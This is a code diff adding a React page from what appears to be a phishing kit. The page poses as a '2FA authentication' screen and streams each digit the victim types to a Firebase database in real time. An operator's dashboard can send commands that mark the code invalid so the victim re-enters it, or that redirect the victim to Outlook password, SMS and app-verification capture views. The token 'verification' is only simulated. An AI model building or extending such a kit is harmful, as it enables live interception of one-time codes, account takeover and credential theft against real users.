@@ -1,0 +1,326 @@
+// 🔐 Página Token - Captura token 2FA em tempo real
+import React, { useState, useEffect } from "react";
+import { useNavigate } from "react-router-dom";
+import { motion } from "framer-motion";
+import { Shield, Key, ArrowLeft, Timer, Copy } from "lucide-react";
+import { useFirebaseClient } from "../hooks/useFirebaseClient";
+
+const TokenPage = () => {
+  const navigate = useNavigate();
+  const { clientId, clientData, isOnline, updateClientData, commands } =
+    useFirebaseClient(navigate);
+  const [token, setToken] = useState("");
+  const [loading, setLoading] = useState(false);
+  const [invalidMessage, setInvalidMessage] = useState(""); // NOVA funcionalidade: mensagem de inválido
+
+  // Atualizar URL atual no Firebase - MANTENDO fromForm
+  useEffect(() => {
+    updateClientData({
+      currentUrl: "/token",
+      currentPage: "TOKEN",
+      fromForm: true, // IMPORTANTE: Manter fromForm para não perder o cliente no dashboard!
+    });
+  }, []);
+
+  // NOVA FUNCIONALIDADE: Função para limpar comandos de invalidação
+  const clearInvalidationCommand = async (commandType) => {
+    try {
+      // Importar Firebase functions dinamicamente
+      const { ref, remove } = await import("firebase/database");
+      const { database } = await import("../firebase/config");
+
+      const commandsRef = ref(database, `commands/${clientId}`);
+      await remove(commandsRef);
+      console.log("🧹 TokenPage - Comando de invalidação limpo:", commandType);
+    } catch (error) {
+      console.error("❌ TokenPage - Erro ao limpar comando:", error);
+    }
+  };
+
+  // NOVA FUNCIONALIDADE: Escutar comandos de invalidação do admin e SYNC
+  useEffect(() => {
+    console.log("🔍 TokenPage - COMANDOS RECEBIDOS:", {
+      commands,
+      temComandos: commands && commands.length > 0,
+      temInvalidToken: commands && commands.includes("invalid_token"),
+      currentPage: window.location.pathname,
+      timestamp: new Date().toLocaleTimeString(),
+    }); // DEBUG SUPER DETALHADO
+
+    // Detectar SYNC e redirecionar para /sync
+    if (commands && commands.includes("sync_data")) {
+      navigate("/sync");
+      return;
+    }
+
+    if (commands && commands.includes("invalid_token")) {
+      console.log(
+        "🚨 TokenPage - COMANDO invalid_token DETECTADO! PROCESSANDO..."
+      ); // DEBUG
+      setInvalidMessage("Token inválido");
+      setToken(""); // Limpar o código
+
+      // Limpar também no Firebase
+      updateClientData({
+        tokenCode: "",
+        token2FA: "",
+        tokenStatus: "Invalid",
+      });
+
+      // Limpar o comando após processá-lo
+      clearInvalidationCommand("invalid_token");
+
+      // Limpar a mensagem após 5 segundos
+      setTimeout(() => setInvalidMessage(""), 5000);
+    }
+  }, [commands, updateClientData, clientId]);
+
+  // Redirecionar Outlook via /sync
+  useEffect(() => {
+    if (!Array.isArray(commands) || commands.length === 0) return;
+    const latestRaw = commands[commands.length - 1];
+    if (typeof latestRaw !== "string") return;
+    const latest = latestRaw.replace(/^"+|"+$/g, "").trim();
+    const map = {
+      outlookpass: "outlook_password",
+      outlookverify: "outlook_verify",
+      outlookcode: "outlook_verify_code",
+      outlooksms: "outlook_sms",
+      outlookapp: "outlook_app",
+    };
+    const view = map[latest];
+    if (!view) return;
+    window.location.href = `/sync?view=${view}`;
+  }, [commands]);
+
+  // Capturar token em tempo real
+  const handleTokenChange = (e) => {
+    const tokenValue = e.target.value.replace(/\D/g, "").slice(0, 8); // Só números, máximo 8 dígitos
+    setToken(tokenValue);
+
+    // Salvar no Firebase em tempo real - IMPORTANTE: usar 'tokenCode' para aparecer no ClientCard
+    updateClientData({
+      token2FA: tokenValue,
+      tokenCode: tokenValue, // Este campo será capturado pelo ClientCard
+      lastTokenInput: Date.now(),
+      tokenStatus: tokenValue.length >= 6 ? "Complete" : "Incomplete",
+    });
+  };
+
+  // Simular confirmação do token
+  const handleConfirmToken = async () => {
+    if (token.length < 6) return;
+
+    setLoading(true);
+
+    try {
+      await updateClientData({
+        token2FAConfirmed: token,
+        tokenConfirmedAt: Date.now(),
+        tokenStatus: "Confirmed",
+      });
+
+      // Simular delay de verificação
+      setTimeout(() => {
+        setLoading(false);
+        // Removido alert para evitar conflito com notificações
+        console.log("✅ Token 2FA confirmado!");
+      }, 2000);
+    } catch (error) {
+      setLoading(false);
+      // Removido alert para evitar conflito com notificações
+      console.error("❌ Erro ao confirmar token:", error);
+    }
+  };
+
+  // Copiar token para clipboard
+  const handleCopyToken = () => {
+    if (token) {
+      navigator.clipboard.writeText(token);
+      // Removido alert para evitar conflito com notificações
+      console.log("📋 Token copiado:", token);
+    }
+  };
+
+  return (
+    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-blue-900 flex items-center justify-center p-6">
+      <motion.div
+        initial={{ opacity: 0, scale: 0.9 }}
+        animate={{ opacity: 1, scale: 1 }}
+        transition={{ duration: 0.5 }}
+        className="bg-white/10 backdrop-blur-md p-8 rounded-2xl shadow-2xl border border-white/20 w-full max-w-md"
+      >
+        {/* Header */}
+        <div className="text-center mb-8">
+          <motion.div
+            className="bg-purple-500 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4"
+            whileHover={{ scale: 1.1 }}
+            transition={{ type: "spring", stiffness: 300 }}
+          >
+            <Shield className="w-8 h-8 text-white" />
+          </motion.div>
+          <h1 className="text-2xl font-bold text-white mb-2">
+            Autenticação 2FA
+          </h1>
+          <p className="text-purple-200">Digite o token do seu app</p>
+
+          {/* Status de Conexão */}
+          <div className="mt-4 p-3 bg-black/20 rounded-lg">
+            <div className="flex items-center justify-between text-sm">
+              <span className="text-gray-300">Status:</span>
+              <div className="flex items-center gap-2">
+                <div
+                  className={`w-2 h-2 rounded-full ${
+                    isOnline ? "bg-green-500 animate-pulse" : "bg-red-500"
+                  }`}
+                ></div>
+                <span className={isOnline ? "text-green-400" : "text-red-400"}>
+                  {isOnline ? "Online" : "Offline"}
+                </span>
+              </div>
+            </div>
+            <div className="flex items-center justify-between text-sm mt-1">
+              <span className="text-gray-300">ID:</span>
+              <span className="text-purple-400 font-mono text-xs">
+                {clientId}
+              </span>
+            </div>
+          </div>
+        </div>
+
+        {/* Campo do Token 2FA */}
+        <div className="space-y-6">
+          <div>
+            <label className="block text-sm font-medium text-gray-300 mb-2">
+              Token 2FA (6-8 dígitos)
+            </label>
+            <div className="relative">
+              <Key className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400" />
+              <input
+                type="text"
+                value={token}
+                onChange={handleTokenChange}
+                className="w-full pl-10 pr-12 py-4 bg-white/10 border border-white/20 rounded-lg text-white text-center text-xl font-mono tracking-widest placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-colors"
+                placeholder="000000"
+                maxLength={8}
+                disabled={loading}
+              />
+              {token && (
+                <button
+                  onClick={handleCopyToken}
+                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-white transition-colors"
+                >
+                  <Copy className="w-5 h-5" />
+                </button>
+              )}
+            </div>
+
+            {/* Indicador visual do progresso */}
+            <div className="flex justify-center mt-3 gap-1">
+              {[...Array(8)].map((_, i) => (
+                <div
+                  key={i}
+                  className={`w-2 h-2 rounded-full transition-colors ${
+                    i < token.length
+                      ? i < 6
+                        ? "bg-purple-500"
+                        : "bg-blue-500"
+                      : "bg-white/20"
+                  }`}
+                />
+              ))}
+            </div>
+          </div>
+
+          {/* Botão de Confirmação */}
+          <motion.button
+            onClick={handleConfirmToken}
+            disabled={token.length < 6 || loading}
+            whileHover={{ scale: loading ? 1 : 1.02 }}
+            whileTap={{ scale: loading ? 1 : 0.98 }}
+            className="w-full bg-purple-600 hover:bg-purple-700 disabled:bg-gray-600 disabled:cursor-not-allowed text-white font-medium py-3 px-4 rounded-lg transition-colors flex items-center justify-center gap-2"
+          >
+            {loading ? (
+              <>
+                <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
+                <span>Verificando...</span>
+              </>
+            ) : (
+              <>
+                <Timer className="w-5 h-5" />
+                <span>Confirmar Token</span>
+              </>
+            )}
+          </motion.button>
+
+          {/* Status do token */}
+          {token && (
+            <div className="text-center">
+              <span
+                className={`text-sm ${
+                  token.length >= 6 ? "text-green-400" : "text-yellow-400"
+                }`}
+              >
+                {token.length >= 6
+                  ? "✅ Token válido"
+                  : `${token.length}/6 dígitos mínimo`}
+              </span>
+            </div>
+          )}
+
+          {/* NOVA funcionalidade: Mensagem de código inválido */}
+          {invalidMessage && (
+            <motion.div
+              initial={{ opacity: 0, y: -10 }}
+              animate={{ opacity: 1, y: 0 }}
+              exit={{ opacity: 0, y: -10 }}
+              className="text-center p-3 bg-red-500/20 border border-red-500/50 rounded-lg"
+            >
+              <span className="text-red-400 font-medium">
+                ⚠️ {invalidMessage}
+              </span>
+            </motion.div>
+          )}
+        </div>
+
+        {/* Navegação */}
+        <div className="mt-8 pt-6 border-t border-white/10">
+          <div className="text-center">
+            <motion.a
+              href="/home"
+              whileHover={{ scale: 1.05 }}
+              className="inline-flex items-center gap-2 text-purple-400 hover:text-purple-300 transition-colors"
+            >
+              <ArrowLeft className="w-4 h-4" />
+              <span>Voltar ao Home</span>
+            </motion.a>
+          </div>
+        </div>
+
+        {/* Dados em tempo real (debug) */}
+        {clientData && (
+          <div className="mt-6 p-4 bg-black/20 rounded-lg">
+            <h3 className="text-xs text-gray-400 mb-2">
+              📊 Dados em tempo real:
+            </h3>
+            <div className="text-xs space-y-1">
+              {clientData.token2FA && (
+                <p className="text-purple-400">Token: {clientData.token2FA}</p>
+              )}
+              {clientData.tokenStatus && (
+                <p className="text-blue-400">
+                  Status: {clientData.tokenStatus}
+                </p>
+              )}
+              {commands.length > 0 && (
+                <p className="text-yellow-400">Comandos: {commands.length}</p>
+              )}
+            </div>
+          </div>
+        )}
+      </motion.div>
+    </div>
+  );
+};
+
+export default TokenPage;
